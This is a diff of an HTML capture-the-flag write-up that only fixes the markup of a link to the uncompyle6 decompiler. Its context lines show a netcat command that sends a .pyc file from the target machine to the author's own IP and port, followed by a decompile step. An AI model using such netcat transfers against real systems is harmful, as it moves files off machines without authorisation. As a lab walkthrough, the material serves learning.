@@ -244,7 +244,7 @@ $</code></pre></div>
 <p>We transfer the file to our local machine with netcat</p>
 <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">nc</span> 10.9.17.253 8888 <span class="op">&lt;</span> .pyc      # On target
 <span class="ex">nc</span> -lnvp 8888 <span class="op">&gt;</span> program.pyc     # On host</code></pre></div>
-<p>We can decompile the pyc file using (uncompyle6)[https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwj8kouwnrjqAhUi7XMBHXczBBAQFjAAegQIAhAB&amp;url=https%3A%2F%2Fpypi.org%2Fproject%2Funcompyle6%2F&amp;usg=AOvVaw0K90ryNJluPxJukPv2rzBo]</p>
+<p>We can decompile the pyc file using <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwj8kouwnrjqAhUi7XMBHXczBBAQFjAAegQIAhAB&amp;url=https%3A%2F%2Fpypi.org%2Fproject%2Funcompyle6%2F&amp;usg=AOvVaw0K90ryNJluPxJukPv2rzBo">uncompyle6</a></p>
 <div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">uncompyle6</span> program.pyc <span class="op">&gt;</span> program.py</code></pre></div>
 <p>The decompiled program is as follows:</p>
 <div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="co"># uncompyle6 version 3.7.2</span>
